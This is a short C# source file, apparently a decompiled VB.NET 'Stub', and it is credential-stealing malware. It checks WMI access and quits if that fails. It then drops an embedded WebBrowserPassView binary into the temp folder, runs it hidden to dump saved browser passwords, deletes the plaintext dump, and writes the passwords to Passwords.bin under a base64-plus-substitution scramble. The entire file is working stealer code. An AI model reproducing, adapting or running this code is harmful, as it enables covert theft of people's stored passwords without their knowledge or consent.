using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Stub.My.Resources;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace Stub
{
	[StandardModule]
	internal sealed class Stub
	{
		[STAThread]
		public static void main()
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2"))));
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
			File.WriteAllBytes(Path.GetTempPath() + "\\Hassan.exe", Resources.WebBrowserPassView);
			Interaction.Shell(Path.GetTempPath() + "\\Hassan.exe /stext " + Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt", AppWinStyle.Hide);
			string s = File.ReadAllText(Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt");
			File.Delete(Interaction.Environ("tmp") + "\\PassByHassanAmiri.txt");
			string contents = Convert.ToBase64String(Encoding.ASCII.GetBytes(s)).Replace("p", "axx");
			File.WriteAllText(Path.GetTempPath() + "\\Passwords.bin", contents);
			Application.Exit();
		}
	}
}
